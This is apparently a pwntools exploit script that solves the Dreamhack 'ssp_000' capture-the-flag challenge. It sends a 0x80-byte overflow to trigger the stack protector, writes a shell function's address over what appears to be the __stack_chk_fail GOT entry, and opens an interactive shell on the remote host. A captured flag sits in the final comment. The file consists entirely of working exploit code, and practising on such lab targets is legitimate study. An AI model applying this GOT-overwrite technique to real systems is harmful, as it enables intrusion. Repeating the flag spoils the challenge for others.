from pwn import *

# p = process("./ssp_000")
p = remote("host1.dreamhack.games",8463)

shell = 0x4008ea 
fail_addr = 0x601020


payload1 = ""
payload1 += "a"*0x80

p.sendline(payload1)

p.sendlineafter("Addr",str(fail_addr))
p.sendlineafter("Value",str(shell))


p.interactive()
#DH{e4d253b82911565ad8dd9625fb491ab0}